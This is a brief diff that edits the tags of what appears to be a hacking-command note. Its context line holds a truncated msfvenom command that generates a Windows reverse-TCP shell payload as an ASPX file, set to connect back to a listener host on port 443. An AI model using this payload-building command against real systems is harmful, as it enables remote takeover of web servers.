@@ -10,4 +10,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f aspx -o rev_shel
 
 Tags:
 
-    #assorted #command #hacking #msfvenom
+    #command #hacking #msfvenom 
